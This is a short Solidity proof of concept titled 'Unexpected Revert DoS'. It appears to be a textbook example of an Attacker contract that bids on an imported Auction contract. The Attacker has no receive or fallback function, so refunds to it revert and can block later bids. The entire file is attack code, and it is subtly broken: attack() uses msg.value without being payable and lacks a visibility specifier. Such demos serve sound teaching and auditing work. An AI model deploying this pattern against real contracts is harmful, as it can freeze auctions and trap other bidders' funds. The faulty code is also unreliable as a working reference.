// Unexpected Revert DoS
import "./Auction.sol";  
contract Attacker{
   Auction auction;
 
   constructor(Auction _auctionaddr){
       auction = Auction(_auctionaddr);
   }
   function attack (){
       auction.bid{value: msg.value}();
   }
}
